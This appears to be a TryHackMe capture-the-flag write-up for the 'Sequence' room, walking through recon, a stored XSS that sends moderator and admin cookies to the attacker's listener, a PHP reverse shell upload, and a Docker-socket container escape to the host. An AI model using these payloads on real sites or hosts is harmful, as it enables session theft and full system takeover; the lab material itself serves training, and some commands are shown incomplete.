# TryHackMe-Sequence

Robert made some last-minute updates to the review.thm website before heading off on vacation. He claims that the secret information of the financiers is fully protected. But are his defenses truly airtight? Your challenge is to exploit the vulnerabilities and gain complete control of the system.

sudo nano /etc/hosts
10.201.13.226 review.thm

Scan

rustscan -a 10.201.13.226 -- -sV -sC -oN Sequence-scan.txt

Nmap 7.95 scan initiated Sun Sep 21 06:48:33 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -4 -sV -sC -oN Sequence-scan.txt 10.201.13.226
Nmap scan report for review.thm (10.201.13.226)
Host is up, received timestamp-reply ttl 61 (0.26s latency).
Scanned at 2025-09-21 06:48:33 EDT for 16s

PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 34:1e:e0:14:9a:60:3c:da:de:25:dd:1d:96:a1:60:31 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+...KM=
| 256 84:be:3e:fe:68:31:e9:51:3e:b1:ad:09:75:37:7f:da (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFNj...
| 256 c6:9f:63:34:a3:38:df:aa:94:b1:e0:37:4d:57:e6:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKIUxC0ybPtqSHPMe0xQn5ngkm7VBdD4UmMv6+tr8b00
80/tcp open http syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|http-server-header: Apache/2.4.41 (Ubuntu)
|http-title: Review Shop
| http-methods:
| Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
| /:
| PHPSESSID:
| httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done at Sun Sep 21 06:48:49 2025 -- 1 IP address (1 host up) scanned in 16.02 seconds
Gobuster (directory enumeration)

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
[+] Url: http://review.thm//
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.8
[+] Timeout: 10s
Starting gobuster in directory enumeration mode
/.hta (Status: 403) [Size: 275]
/.htpasswd (Status: 403) [Size: 275]
/.htaccess (Status: 403) [Size: 275]
/index.php (Status: 200) [Size: 1694]
/javascript (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
/mail (Status: 301) [Size: 307] [--> http://review.thm/mail/]
/phpmyadmin (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
/server-status (Status: 403) [Size: 275]
/uploads (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
Progress: 4613 / 4613 (100.00%)
Finished

<img width="1276" height="722" alt="image" src="https://github.com/user-attachments/assets/ff1f8723-f3e0-47ef-960a-7b748578d365" />

An important information, please take notes

After the search process, I discovered the http://review.thm/contact.php can send a message to the mod I tried the Script XSS and it succeeded

<img width="1280" height="745" alt="image" src="https://github.com/user-attachments/assets/4f8b3c65-2e92-4611-a8d1-80bcf7e9a00a" />

Image <script> var img = new Image(); img.src = 'http://:4444/stealcookies?' + document.cookie; </script>
Then I started the http server

python3 -m http.server 4444

We have gained the cookies of the mod

$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.201.50.181 - - [22/Sep/2025 11:23:39] code 404, message File not found
10.201.50.181 - - [22/Sep/2025 11:23:39] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
10.201.50.181 - - [22/Sep/2025 11:23:42] code 404, message File not found
10.201.50.181 - - [22/Sep/2025 11:23:42] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
10.201.50.181 - - [22/Sep/2025 11:23:44] code 404, message File not found
10.201.50.181 - - [22/Sep/2025 11:23:44] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.

Copy the cookies value of the mod to our value and then reload the page

<img width="1276" height="757" alt="image" src="https://github.com/user-attachments/assets/1cae25f0-257b-4cd4-91cf-f9f02aa1ce7c" />

That's right, we can see the mod flag at the top of the page 👍

After that, we got the Mod page, I seemed to pay attention to the chat section with the Admin, after trying a lot of Payload XSS and it was not successful, but what I did not think about was that we could send the admin to the feedback link that we sent http://review.thm/contact.php

python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.201.50.181 - - [22/Sep/2025 11:37:49] code 404, message File not found
10.201.50.181 - - [22/Sep/2025 11:37:49] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
10.201.50.181 - - [22/Sep/2025 11:37:51] code 404, message File not found
10.201.50.181 - - [22/Sep/2025 11:37:51] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
10.201.50.181 - - [22/Sep/2025 11:37:52] code 404, message File not found
10.201.50.181 - - [22/Sep/2025 11:37:52] "GET /stealcookies?PHPSESSID=836k3hecvt40k2pml7b24mb11n HTTP/1.1" 404 -
10.201.50.181 - - [22/Sep/2025 11:37:54] code 404, message File not found
10.201.50.181 - - [22/Sep/2025 11:37:54] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
10.201.50.181 - - [22/Sep/2025 11:37:56] code 404, message File not found
10.201.50.181 - - [22/Sep/2025 11:37:56] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
10.201.50.181 - - [22/Sep/2025 11:37:59] code 404, message File not found
10.201.50.181 - - [22/Sep/2025 11:37:59] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -

This is admin cookies 836k3hecvt40k2pml7b24mb11n
So we have flag2
In the third flag I took a lot of time but after I was completed I felt that I was complicated on a simple problem 😄
In http://review.thm/mail/dump.txt has provided us with some important things

<img width="556" height="358" alt="image" src="https://github.com/user-attachments/assets/d703df3d-a86a-41be-8a84-579ac50c88ad" />

First, this page has lacked finance.php, right?
I fixed lottery.php to finance.php

<img width="552" height="576" alt="image" src="https://github.com/user-attachments/assets/00ce95a6-fa74-4daa-8946-88da12065dc2" />

That's right and we also have a password from mail : S60u}f5j

I used Reverse Shell from here https://github.com/pentestmonkey/php-reverse-shell

After upload i went to http://review.thm/uploads/ but it was empty, maybe it was in an internal

<img width="679" height="353" alt="image" src="https://github.com/user-attachments/assets/9844e0b1-a8f2-41de-8692-81461434c666" />

I tried to do like now just fix lottery.php to uploads/php-reverse-shell.php And so I got reverse shell
We are in a docker container let’s start by upgrading to shell : python3 -c "import pty;pty.spawn('/bin/bash')"

Right here, I have spent a lot of time and even stayed up all night using resources from Google and ChatGPT. I am currently very weak in this area, so I may feel a bit lost and unclear from this point onward.
First, create a container for Docker and then you can access the file system here:

Get the available images
curl --unix-socket /var/run/docker.sock http://localhost/images/json

curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{
"Image": "php:8.1-cli",
"Cmd": ["/bin/sh"],
"Tty": true,
"HostConfig": {
"Privileged": true,
"Binds": ["/:/host"]
}
}' http://localhost/containers/create

Save id from previous script

curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers//start

docker exec -it chroot /host /bin/bash

So we have the third flag 👍

<img width="1372" height="613" alt="image" src="https://github.com/user-attachments/assets/cb6ce8d0-36f9-4466-a0ea-c63409c516e8" />
